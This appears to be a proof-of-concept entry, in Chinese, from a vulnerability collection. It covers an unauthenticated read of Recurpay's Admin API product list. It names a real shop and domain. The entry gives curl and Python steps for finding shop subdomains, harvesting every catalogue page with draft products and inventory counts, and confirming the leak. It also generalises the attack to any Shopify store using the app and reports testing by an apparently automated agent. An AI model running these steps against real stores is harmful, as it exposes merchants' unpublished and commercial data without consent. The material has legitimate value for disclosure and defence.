# Recurpay 店铺子域 Admin API /admin/api/2024-07/products 未鉴权读取全量商品目录（含未发布草稿与后台库存字段）

- **code**: recurpay-admin-api-products-list-unauth-read-drafts
- **kind**: poc
- **category**: unauthorized
- **component**: Recurpay（Shopify 订阅 app，店铺子域 Admin REST API，路径版本段 2024-07）
- **versions**: 2024-07
- **severity**: medium
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: task#8 / finding_id=117（finding_checks.verdict=verified，status=confirmed）。2026-11-11 由平台 work agent（intent#1468）本机 curl 直连实测，UA=$ARTEX_UA，未使用任何凭据（无 Authorization / X-Recurpay-Access-Token / Cookie）：① GET https://gamers-delight-online.recurpay.com/admin/api/2024-07/products → HTTP 200，290,327 bytes，body {success,data,page_info}，page_info.total=2428 / total_pages=25；② ?page=2..25 全部 200，汇总 total=2428（status=true 2376 / status=false 52，草稿含 lego-star-wars-the-video-game-platinum、test、Untitled Jul5_13:48）；③ 同前缀对照 orders/subscriptions/plans/webhooks/authenticate 全部 401、customers/shop 404，证明仅 products 列表漏鉴权；④ 非公开性反证：GET https://gamersdelight.co.uk/products/lego-star-wars-the-video-game-platinum → 404，而 published 对照 bioshock-2-xbox360、destiny-playstation-3-copy → 200；⑤ 写路径 OPTIONS allow: GET,HEAD、POST 405、单商品 PUT/PATCH/DELETE 404，故为只读泄露；⑥ 文档佐证 docs.recurpay.com/reference/authentication 声明所有 REST Admin API 均需 access token。判定成立依据：无凭据 200 + 返回 admin 序列化字段 + 草稿在 storefront 不可见 + 同前缀其余资源 401 的四重对照。
- **path**: pocs/recurpay-admin-api-products-list-unauth-read-drafts/poc.http
- **tags**: recurpay,shopify,admin-api,unauthorized,info-leak,products,drafts,2024-07,no-token
- **created_at**: 2026-11-11T17:16:11.068Z
- **engine**: https://gamers-delight-online.recurpay.com
- **found_by**: internal

## 描述

Recurpay 为每个 Shopify 店铺开的 <shop>.recurpay.com 子域上，Admin REST API 的**产品列表**漏了鉴权：不带任何 token/Cookie 请求 GET /admin/api/2024-07/products 直接 200，返回全量商品（分页 page_info 给出 total/total_pages），其中包含 status=false 的未发布草稿（公开 storefront 上 404），且 variants 带 inventory_quantity / inventory_item_id / sku / price 等后台序列化字段。同前缀的 orders/subscriptions/plans/webhooks/authenticate 均正确返回 401，说明只有该列表端点漏鉴权；写路径全部被拒（OPTIONS 只允许 GET,HEAD、POST 405、PUT/PATCH/DELETE 404），故为只读信息泄露，不含顾客 PII。适用面：任何用 Recurpay 订阅 app 的 Shopify 店，子域名可由店铺 handle 推出。

## 用法

```
前置：目标店铺接了 Recurpay 订阅 app，其 <shop-handle>.recurpay.com 公网可达；无需账号/Cookie/X-Recurpay-Access-Token。UA 用浏览器类（$ARTEX_UA）。

【0) 定位 Recurpay 子域 + shop 域】
curl -s 'https://<storefront>/meta.json' | python3 -c 'import sys,json;print(json.load(sys.stdin)["shop"])'   # gamers-delight-online.myshopify.com
curl -s 'https://<storefront>/' | grep -oiE '[a-z0-9-]+\.recurpay\.com' | sort -u                        # 前端 JS 里常直接出现
# 经验规则：子域 = shop 域去掉 .myshopify.com，如 gamers-delight-online.myshopify.com -> gamers-delight-online.recurpay.com

【1) 基线对照：先确认这个前缀确实强制鉴权（避免把「本来就全开放」误判成漏鉴权）】
T=https://<shop-handle>.recurpay.com
for p in orders subscriptions plans webhooks authenticate; do
  printf '%-16s ' "$p"; curl -s -o /dev/null -w '%{http_code}\n' "$T/admin/api/2024-07/$p" -A "$ARTEX_UA"
done
# 期望：全 401；customers/shop -> 404。若这里也 200，说明整站无鉴权，性质更重，另立条目。

【2) 命中：产品列表无凭据可读】
curl -s -D - -A "$ARTEX_UA" "$T/admin/api/2024-07/products" -o prod.json
# 期望 HTTP 200 + content-type: application/json
# {"success":true,"data":{"products":[{...,"status":true,...}]},
#  "page_info":{"total":2428,"count":100,"current_page":1,"total_pages":25,...}}

【3) 翻页收割全量（page_info.total_pages 决定循环上限）】
for p in $(seq 1 25); do curl -s -A "$ARTEX_UA" "$T/admin/api/2024-07/products?page=$p" -o "p$p.json"; sleep 1; done
python3 - <<'PY'
import json,glob
items=[]
for f in sorted(glob.glob('p*.json')):
    items += json.load(open(f))['data']['products']
print('total',len(items),'drafts',sum(1 for x in items if not x.get('status')))
PY

【4) 草稿非公开的证据（判定「暴露了非公开数据」的关键一步）】
curl -s -o /dev/null -w '%{http_code}\n' 'https://<storefront>/products/<draft-handle>'   # 期望 404
curl -s -o /dev/null -w '%{http_code}\n' 'https://<storefront>/products/<published-handle>' # 期望 200（对照）

【5) 只读定性（避免误报为可写）】
curl -s -X OPTIONS -D - -o /dev/null "$T/admin/api/2024-07/products" -A "$ARTEX_UA" | grep -i '^allow'   # allow: GET,HEAD
curl -s -o /dev/null -w '%{http_code}\n' -X POST   "$T/admin/api/2024-07/products" -A "$ARTEX_UA"        # 405
curl -s -o /dev/null -w '%{http_code}\n' -X DELETE "$T/admin/api/2024-07/products/<id>" -A "$ARTEX_UA"   # 404

判据：步骤 2 无凭据 200 且 page_info.total>0；步骤 1 同前缀其余资源 401（说明是单端点漏鉴权而非全站开放）；步骤 4 草稿 404 而 published 200（说明泄露的是非公开数据）。
失败常见原因：① 子域猜错（应为店铺 handle，不是自定义域名）→ DNS/NXDOMAIN；② API 版本段变化，2024-07 换掉后 404，需从店铺前端 JS 或 docs 里取当前版本段；③ 裸 curl UA 被前置 CDN 拦成 403/挑战页 → 换浏览器 UA；④ 若 products 也 401，说明该店（或该 app 版本）已补齐鉴权，放弃；⑤ 返回 200 但 data.products 为空 → shop 绑错或该店无商品。
```

## 正文

```
# Recurpay 店铺子域 Admin API 产品列表未鉴权读取

## 组件 / 版本
Recurpay（Shopify 订阅 app）为每个店铺开一个子域：`https://<shop-handle>.recurpay.com`
Admin REST API 路径版本段：`2024-07`
官方文档（docs.recurpay.com/reference/authentication）明确："All REST Admin API queries require a valid Recurpay access token"（头 `X-Recurpay-Access-Token`）。
本条目记录的是**该前缀下唯一漏鉴权的端点：产品列表**。

## 前置条件
- 目标店铺接了 Recurpay 订阅 app，且 `<shop-handle>.recurpay.com` 公网可达。
- 无需任何账号、Cookie、token 或鉴权头。
- 需要先知道店铺 handle（= Shopify `<shop>.myshopify.com` 的前半段）。
  - 取法一：`GET https://<storefront>/meta.json` → `shop` 字段。
  - 取法二：店铺首页/前端 JS 里 grep `[a-z0-9-]+\.recurpay\.com`。
  - 经验规则：子域就是 shop 域去掉 `.myshopify.com`。

## 复现

### 0) 基线对照：确认该前缀其余资源确实强制鉴权
```bash
T=https://gamers-delight-online.recurpay.com   # <shop-handle>.recurpay.com
UA="$ARTEX_UA"                                  # 浏览器类 UA
for p in orders subscriptions plans webhooks authenticate; do
  printf '%-16s ' "$p"; curl -s -o /dev/null -w '%{http_code}\n' "$T/admin/api/2024-07/$p" -A "$UA"
done
# orders 401 / subscriptions 401 / plans 401 / webhooks 401 / authenticate 401
# 附带：customers、shop -> 404
```

### 1) 命中：无凭据读取产品列表
```http
GET /admin/api/2024-07/products HTTP/2
Host: gamers-delight-online.recurpay.com
User-Agent: <browser UA>
(无 Authorization / X-Recurpay-Access-Token / Cookie)
```
```http
HTTP/2 200
content-type: application/json

{"success":true,
 "data":{"products":[{"id":"8494245544217","handle":"deathloop-playstation-5","status":true,
                      "variants":[{"sku":"...","price":"...","inventory_quantity":N,
                                   "inventory_item_id":"...", ...}], ...}]},
 "page_info":{"total":2428,"count":100,"current_page":1,"total_pages":25,
              "has_previous_page":false,"has_next_page":true}}
```
（实测该店首次响应 290,327 bytes。）

### 2) 翻页枚举全量
```bash
for p in $(seq 1 25); do
  curl -s -A "$UA" "$T/admin/api/2024-07/products?page=$p" -o "p$p.json"; sleep 1
done
python3 - <<'PY'
import json, glob
items = []
for f in sorted(glob.glob('p*.json')):
    items += json.load(open(f))['data']['products']
print('total', len(items), 'published', sum(1 for x in items if x.get('status')),
      'drafts', sum(1 for x in items if not x.get('status')))
PY
# 实测：total 2428（25 页 × 100），status=true 2376，status=false 52
```
`?page=2` 的 `page_info` 会正确递增：`{"total":2428,"count":100,"current_page":2,"total_pages":25,"has_previous_page":true,"has_next_page":true}`。

### 3) 证明暴露的是非公开数据（草稿在 storefront 不可见）
```bash
curl -s -o /dev/null -w 'draft  %{http_code}\n' 'https://gamersdelight.co.uk/products/lego-star-wars-the-video-game-platinum'
curl -s -o /dev/null -w 'pub-1  %{http_code}\n' 'https://gamersdelight.co.uk/products/bioshock-2-xbox360'
curl -s -o /dev/null -w 'pub-2  %{http_code}\n' 'https://gamersdelight.co.uk/products/destiny-playstation-3-copy'
# 草稿 404；published 对照均 200
```
草稿样例含 `lego-star-wars-the-video-game-platinum`（公开 URL 404）、`test`、`Untitled Jul5_13:48` 之类内部占位商品。

### 4) 只读定性（写路径全被拒）
```bash
curl -s -X OPTIONS -D - -o /dev/null "$T/admin/api/2024-07/products" -A "$UA" | grep -i '^allow'  # allow: GET,HEAD
curl -s -o /dev/null -w '%{http_code}\n' -X POST   "$T/admin/api/2024-07/products"      -A "$UA"     # 405
curl -s -o /dev/null -w '%{http_code}\n' -X PUT    "$T/admin/api/2024-07/products/<id>" -A "$UA"     # 404
curl -s -o /dev/null -w '%{http_code}\n' -X PATCH  "$T/admin/api/2024-07/products/<id>" -A "$UA"     # 404
curl -s -o /dev/null -w '%{http_code}\n' -X DELETE "$T/admin/api/2024-07/products/<id>" -A "$UA"     # 404
```

## 判据
1. 步骤 1 不带任何凭据返回 **200 + `{"success":true,"data":{"products":[...]}}`**，且 `page_info.total` 非零 —— 命中。
2. 步骤 0 同前缀 `orders/subscriptions/plans/webhooks/authenticate` 全为 **401** —— 说明是**单端点漏鉴权**，而不是整站无鉴权（后者性质更重，应另立条目）。
3. 步骤 3 草稿 404 / published 200 —— 说明泄露的是非公开数据（未发布上下架状态、内部占位商品），不是公开目录的镜像。
4. 步骤 4 写方法全被拒 —— 定性为只读信息泄露。

## 影响面
- 泄露：全量商品 + 精确库存数量（`inventory_quantity`）、`inventory_item_id`、SKU、价格、上架状态（`status`）、后台序列化字段与 admin 链接。
- 额外情报价值：草稿商品名可反推未公开的营销/上新计划；库存量可推断销售规模与备货节奏。
- 不含顾客 PII（同前缀 customers 为 404，orders 为 401）。

## 失败常见原因
- 子域写错：必须用 `<shop-handle>.recurpay.com`，不是店铺自定义域名。
- 版本段变更：`2024-07` 失效后返回 404，需从店铺前端 JS / Recurpay 文档取当前版本段。
- 裸 curl UA 被前置 CDN 拦（403/挑战页）：换浏览器类 UA。
- 该店 products 也返回 401：说明已补齐鉴权，放弃；换同 app 的其他店铺试。
- 200 但 products 为空：shop 绑错或该店无商品。

## 来源
task#8 / finding_id=117（verdict=verified，status=confirmed）；2026-11-11 平台 work agent 本机 curl 实测，原始响应落盘 `prod.json`、`p2.json..p25.json`、`all_products.json`、`evidence.log`。
```
